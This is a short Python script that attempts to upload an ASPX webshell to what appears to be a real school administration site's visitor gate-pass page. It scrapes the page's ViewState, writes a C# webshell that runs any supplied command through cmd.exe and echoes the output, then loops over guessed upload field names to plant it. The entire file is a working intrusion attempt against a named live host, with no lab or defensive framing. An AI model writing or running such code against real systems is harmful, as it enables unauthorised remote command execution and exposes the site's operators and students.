import requests
import re
import html

session = requests.Session()
gatepass_url = "https://econnectapp.jupsoft.com/StudentAdministration/Erp_VisitorGatePassNew.aspx?id=+ub90+AGTvY="

# GET the page
r = session.get(gatepass_url)
html_content = r.text

# Extract ViewState
viewstate = re.search(r'__VIEWSTATE" value="([^"]+)"', html_content)
vs = html.unescape(viewstate.group(1)) if viewstate else ""

# Create a minimal ASPX webshell - save as cmd.aspx
with open("cmd.aspx", "w") as f:
    f.write('''<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    if (Request["cmd"] != null) {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + Request["cmd"];
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write(p.StandardOutput.ReadToEnd());
    }
}
</script>''')

# Now try to upload using the form
# The upload field name needs to be found from the actual HTML
# Try common ASP.NET file upload control names
upload_names = ["FileUpload1", "fileUpload", "Upload1", "fuPhoto", "fileToUpload", 
                "uplDocument", "uploadDocument", "ctl00_Content_FileUpload1"]

# Try uploading with different potential field names
for field in upload_names:
    try:
        r2 = session.post(
            gatepass_url,
            files={field: ("cmd.aspx", open("cmd.aspx", "rb"), "application/octet-stream")},
            data={
                "__VIEWSTATE": vs,
                "txtVisitorName": "Test",
                "txtMobileNo": "9999999999",
                "btnSubmit": "Submit"
            }
        )
        print(f"[{field}] Status: {r2.status_code}, Length: {len(r2.text)}")
        if "success" in r2.text.lower() or "uploaded" in r2.text.lower():
            print(f"[!] SUCCESS with field: {field}")
            print(r2.text[:1000])
    except Exception as e:
        print(f"[{field}] Error: {e}")

